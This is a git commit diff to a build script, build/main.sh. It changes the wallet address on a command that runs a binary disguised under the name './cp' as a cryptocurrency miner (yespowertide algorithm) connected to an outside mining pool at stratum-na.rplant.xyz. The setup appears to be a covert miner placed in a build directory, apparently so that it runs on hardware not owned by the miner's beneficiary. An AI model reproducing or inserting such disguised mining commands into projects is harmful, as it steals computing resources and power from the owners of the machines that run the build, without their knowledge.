400c4413d01972c8701e0f7594a85dee94c60660
edrivetokenbsc <107461243+edrivetokenbsc@users.noreply.github.com>
2024-12-31 05:34:41 -0600

    Update main.sh

--- build/main.sh
+++ build/main.sh
@@ -1,2 +1,2 @@
 #bash
-./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TXkhs8Rp8cAdfL37XUEd23zia61d7tQ9Ro.a100
+./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TRyHNWPni8BfLAthBFiYbRJf5Z47zQcynb.a100
